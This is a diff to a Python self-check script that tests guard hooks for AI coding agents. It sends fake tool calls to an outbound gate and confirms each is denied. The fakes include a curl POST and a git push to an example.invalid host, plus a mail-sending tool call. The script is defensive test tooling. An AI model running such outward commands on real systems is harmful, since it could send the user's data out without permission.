@@ -18,7 +18,7 @@
 # Deps: stdlib subprocess · json; search (to pick a real title as the query).
 import json, os, re, subprocess, sys, time
 from pathlib import Path
-from . import __version__, config
+from . import __version__, config, trust
 
 GATES = Path(__file__).resolve().parents[1] / "gates"
 DENY_FILES = (".claude/settings.json", ".claude/settings.local.json")
@@ -122,6 +122,8 @@ def codex_posture():
 
 
 def step_outbound(cfg, pilot="claude-code"):
+    """Probe with the payload shape each pilot really sends (Claude Code includes tool_use_id — D65) and read the
+    decision off stdout; the exit code is 0 either way."""
     if not (GATES / "outbound.py").exists():
         return False, "gates/outbound.py not found (install the machine from the repo: pip install -e)"
     if not cfg["outbound"]:
@@ -131,20 +133,28 @@ def step_outbound(cfg, pilot="claude-code"):
     stamp = cfg["hooks_dir"] / "outbound"
     before = stamp.read_text(encoding="utf-8") if stamp.exists() else None
     time.sleep(1.05)
-    fake = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl -X POST https://example.invalid/send"}, "cwd": str(cfg["root"])}
-    fake2 = {"hook_event_name": "PreToolUse", "tool_name": "mcp__mail__send_email", "tool_input": {"to": "x"}, "cwd": str(cfg["root"])}
-    codes = [_run([sys.executable, str(GATES / "outbound.py")], cfg["root"], {"PLUG_ROOT": str(cfg["root"])}, json.dumps(f)).returncode for f in (fake, fake2)]
+    shape = {"claude-code": {"session_id": "s", "tool_use_id": "toolu_x", "permission_mode": "default"}, "codex": {"turn_id": "t", "tool_use_id": "u"}}[pilot]
+    fakes = [dict(shape, hook_event_name="PreToolUse", tool_name=tool, tool_input=inp, cwd=str(cfg["root"])) for tool, inp in
+             (("Bash", {"command": "curl -X POST https://example.invalid/send"}), ("PowerShell", {"command": "git push --dry-run https://example.invalid/x.git"}),
+              ("mcp__mail__send_email", {"to": "x"}))]
+    results = [_run([sys.executable, str(GATES / "outbound.py")], cfg["root"], {"PLUG_ROOT": str(cfg["root"])}, json.dumps(f)) for f in fakes]
     after = stamp.read_text(encoding="utf-8") if stamp.exists() else None
-    ok = 2 in codes and after is not None and after != before
+    def denied(r):
+        try:
+            return r.returncode == 0 and json.loads(r.stdout.strip().splitlines()[-1])["hookSpecificOutput"]["permissionDecision"] == "deny"
+        except (ValueError, IndexError, KeyError):
+            return False
+    verdicts = [denied(r) for r in results]
+    ok = all(verdicts) and after is not None and after != before
     if not ok:
-        return False, "the fake outbound action was not blocked (exit codes %s) or left no stamp" % codes
+        return False, "a fake outward action was not denied (Bash %s · PowerShell %s · mcp %s; the pilot's real payload shape, exit 0 + deny JSON) or left no stamp" % tuple(verdicts)
     if pilot == "codex":                      # D56: Codex blocks on the deny JSON, from a process that exits 0
         stale = config.codex_trust(cfg)       # D58: an untrusted hook is skipped silently, so the gate proves nothing
         if stale:
             return False, "the gate itself works, but Codex will not run it: %s" % stale
-        return True, ("fake outbound action blocked (deny decision honoured), last fired %s · hooks trusted · Codex's "
-                      "own policy is a separate layer on top: %s" % (after, codex_posture()))
-    return True, "fake outbound action blocked (exit 2), last fired %s" % after
+        return True, ("fake outbound actions denied (Bash · PowerShell · mcp, deny JSON on exit 0), last fired %s · hooks trusted · "
+                      "Codex's own policy is a separate layer on top: %s" % (after, codex_posture()))
+    return True, "fake outbound actions denied (Bash · PowerShell · mcp, the payload shape Claude Code sends, deny JSON on exit 0), last fired %s" % after
 
 
 def step_protected(cfg, pilot):
@@ -158,8 +168,8 @@ def step_protected(cfg, pilot):
     parts.append("pre-commit refused a fake write to a protected path" if ok else "pre-commit did not refuse (exit %d)" % r.returncode)
     hook = root / ".git" / "hooks" / "pre-commit"
     hp = subprocess.run(["git", "config", "core.hooksPath"], cwd=str(root), capture_output=True, text=True).stdout.strip()
-    installed = (hook.exists() and "precommit" in hook.read_text(encoding="utf-8", errors="ignore")) or \
-                (hp and (Path(hp) if os.path.isabs(hp) else root / hp).joinpath("pre-commit").exists())
+    installed = trust.hook_ok(hook) or \
+                (hp and trust.hook_ok((Path(hp) if os.path.isabs(hp) else root / hp).joinpath("pre-commit")))
     if not installed:
         ok, parts = False, parts + ["but the content repo has no pre-commit hook installed (gates/hooks/pre-commit)"]
     if pilot == "claude-code":
